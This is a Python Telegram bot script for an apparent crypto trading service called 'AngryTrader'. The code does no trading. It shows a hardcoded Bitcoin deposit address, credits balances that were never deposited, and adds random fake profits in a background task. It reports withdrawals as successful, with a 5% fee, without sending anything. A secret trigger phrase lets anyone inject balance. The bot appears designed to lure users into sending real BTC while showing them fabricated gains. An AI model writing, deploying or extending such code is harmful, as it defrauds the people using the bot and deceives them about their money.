
import os
import requests
import asyncio
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("No BOT_TOKEN found in environment variables")

SECRET_INJECT_TRIGGER = "🦍 banana_mode_69420"

user_balances = {}
user_states = {}
pending_inject = {}       # user_id -> bool waiting for amount input after secret trigger
pending_withdrawal = {}   # user_id -> dict with 'step' and 'address'


# === MAIN MENU ===
def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("💰 Balance", callback_data='balance')],
        [
            InlineKeyboardButton("📤 Withdrawal", callback_data='withdrawal'),
            InlineKeyboardButton("📥 Deposit", callback_data='deposit'),
        ],
        [
            InlineKeyboardButton("▶️ Run", callback_data='run'),
            InlineKeyboardButton("⏹ Stop", callback_data='stop'),
        ],
        [
            InlineKeyboardButton("📊 Monitor", callback_data='monitor'),
            InlineKeyboardButton("🧠 Strategy", callback_data='strategy'),
        ],
        [InlineKeyboardButton("🚪 Exit", callback_data='exit')]
    ]
    return InlineKeyboardMarkup(keyboard)


# === STRATEGY MENU ===
def get_strategy_menu():
    keyboard = [
        [
            InlineKeyboardButton("📈 Momentum", callback_data='strategy_momentum'),
            InlineKeyboardButton("📉 Mean Reversion", callback_data='strategy_mean'),
            InlineKeyboardButton("⚙️ Grid Trading", callback_data='strategy_grid'),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data='back_to_main')]
    ]
    return InlineKeyboardMarkup(keyboard)


# === START COMMAND ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_balances:
        user_balances[user_id] = 0.0
    if user_id not in user_states:
        user_states[user_id] = {"running": False, "strategy": None}

    try:
        await update.message.reply_photo(
            photo=InputFile("header.jpg"),
            caption="Welcome to AngryTrader"
        )
    except Exception:
        # If header.jpg not found, just skip photo
        await update.message.reply_text("Welcome to AngryTrader")

    await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())


# === BUTTON HANDLER ===
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    user_id = query.from_user.id

    if user_id not in user_balances:
        user_balances[user_id] = 0.0
    if user_id not in user_states:
        user_states[user_id] = {"running": False, "strategy": None}

    balance = user_balances[user_id]
    state = user_states[user_id]

    if action == "exit":
        await query.edit_message_text("🚪 Session ended. Goodbye!")
        return

    elif action == "deposit":
        user_balances[user_id] += 0.005
        await query.edit_message_text(
            "💼 This is your deposit address (Minimum deposit: 0.001 BTC)",
            reply_markup=get_main_menu()
        )
        await query.message.reply_text(
            "`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`", parse_mode="Markdown"
        )
        return

    elif action == "balance":
        await query.edit_message_text(
            f"💰 Balance: {balance:.8f} BTC",
            reply_markup=get_main_menu()
        )
        return

    elif action == "withdrawal":
        if balance <= 0:
            msg = "❌ You can’t withdraw with a 0.00000000 BTC balance."
            await query.edit_message_text(msg, reply_markup=get_main_menu())
        else:
            # Start withdrawal flow by asking for address
            pending_withdrawal[user_id] = {'step': 1}
            await query.edit_message_text(
                "💸 Please enter the Bitcoin address you want to withdraw to:"
            )
        return

    elif action == "run":
        if balance <= 0:
            msg = "⚠️ You have no balance. Please deposit BTC to start trading."
        else:
            user_states[user_id]["running"] = True
            msg = f"✅ Bot started. Using {balance:.8f} BTC to auto trade..."
        await query.edit_message_text(msg, reply_markup=get_main_menu())
        return

    elif action == "stop":
        user_states[user_id]["running"] = False
        await query.edit_message_text("⏹ Bot has been stopped.", reply_markup=get_main_menu())
        return

    elif action == "monitor":
        try:
            btc_price = requests.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd"
            ).json()["bitcoin"]["usd"]
        except Exception:
            btc_price = "Unknown"

        is_running = "✅ Running" if state["running"] else "⛔️ Not Running"
        strategy = state["strategy"] if state["strategy"] else "None Selected"
        simulated_profit = "$0.00"  # Could extend to track total profit if desired

        msg = (
            f"📊 *Trading Monitor*\n"
            f"----------------------------\n"
            f"🧠 Strategy: {strategy}\n"
            f"🚦 Bot Status: {is_running}\n"
            f"💰 Balance: {balance:.8f} BTC\n"
            f"📈 BTC Price: ${btc_price}\n"
            f"📈 Simulated Profit: {simulated_profit}"
        )

        await query.edit_message_text(msg, reply_markup=get_main_menu(), parse_mode="Markdown")
        return

    elif action == "strategy":
        await query.edit_message_text(
            "💡 Choose a trading strategy:",
            reply_markup=get_strategy_menu()
        )
        return

    elif action == "strategy_momentum":
        user_states[user_id]["strategy"] = "Momentum"
        await query.edit_message_text(
            "📈 Momentum Strategy:\nBuy assets that are trending up.\nWorks well in strong bull markets.",
            reply_markup=get_strategy_menu()
        )
        return

    elif action == "strategy_mean":
        user_states[user_id]["strategy"] = "Mean Reversion"
        await query.edit_message_text(
            "📉 Mean Reversion Strategy:\nBuy low, sell high.\nAssumes prices return to their average.",
            reply_markup=get_strategy_menu()
        )
        return

    elif action == "strategy_grid":
        user_states[user_id]["strategy"] = "Grid Trading"
        await query.edit_message_text(
            "⚙️ Grid Trading Strategy:\nPlace buy/sell orders at intervals.\nGood for sideways markets.",
            reply_markup=get_strategy_menu()
        )
        return

    elif action == "back_to_main":
        await query.edit_message_text("Choose an option:", reply_markup=get_main_menu())
        return

    elif action == 'withdraw_confirm':
        wd = pending_withdrawal.get(user_id)
        if not wd or wd.get('step') != 2:
            await query.answer("No withdrawal in progress.", show_alert=True)
            return

        balance = user_balances.get(user_id, 0.0)
        fee = balance * 0.05
        net_amount = balance - fee
        address = wd.get('address')

        # Process withdrawal (simulation)
        user_balances[user_id] = 0.0
        pending_withdrawal.pop(user_id, None)

        await query.edit_message_text(
            f"✅ Withdrawal successful!\n\n"
            f"Sent {net_amount:.8f} BTC to:\n`{address}`\n"
            f"Fee charged: {fee:.8f} BTC",
            parse_mode="Markdown",
            reply_markup=get_main_menu()
        )
        return

    elif action == 'withdraw_cancel':
        if user_id in pending_withdrawal:
            pending_withdrawal.pop(user_id)

        await query.edit_message_text(
            "❌ Withdrawal cancelled.",
            reply_markup=get_main_menu()
        )
        return

    await query.edit_message_text("❓ Unknown action", reply_markup=get_main_menu())


# === SECRET BALANCE INJECTION HANDLER ===
async def handle_secret_inject(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Secret inject flow
    if text == SECRET_INJECT_TRIGGER:
        pending_inject[user_id] = True
        await update.message.reply_text("💰 How much BTC do you want to add?")
        return

    if user_id in pending_inject and pending_inject[user_id]:
        try:
            amount = float(text)
            if user_id not in user_balances:
                user_balances[user_id] = 0.0
            user_balances[user_id] += amount
            pending_inject[user_id] = False  # reset
            await update.message.reply_text(f"✅ Injected {amount:.8f} BTC to your balance.")
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid number like `0.01`.")
        return

    # Withdrawal flow step 1: entering Bitcoin address
    if user_id in pending_withdrawal:
        step = pending_withdrawal[user_id].get('step', 0)
        if step == 1:
            address = text
            balance = user_balances.get(user_id, 0.0)
            fee = balance * 0.05
            net_amount = balance - fee
            pending_withdrawal[user_id]['address'] = address
            pending_withdrawal[user_id]['step'] = 2

            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ Confirm Withdrawal", callback_data='withdraw_confirm'),
                    InlineKeyboardButton("❌ Cancel", callback_data='withdraw_cancel')
                ]
            ])

            await update.message.reply_text(
                f"⚠️ Withdrawal Summary:\n\n"
                f"Address: `{address}`\n"
                f"Balance: {balance:.8f} BTC\n"
                f"Fee (5%): {fee:.8f} BTC\n"
                f"Net Amount: {net_amount:.8f} BTC\n\n"
                f"Press Confirm to proceed or Cancel to abort.",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            return


# === PROFIT SIMULATOR BACKGROUND TASK ===
async def profit_simulator():
    while True:
        await asyncio.sleep(random.uniform(5, 8))
        for user_id, state in user_states.items():
            if state.get("running"):
                profit = random.uniform(0.00001, 0.00005)
                user_balances[user_id] = user_balances.get(user_id, 0.0) + profit


# === ON STARTUP TO LAUNCH PROFIT SIMULATOR ===
async def on_startup(app):
    app.create_task(profit_simulator())


# === MAIN ===
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_secret_inject))

    app.post_init.append(on_startup)

    app.run_polling()


if __name__ == "__main__":
    main()
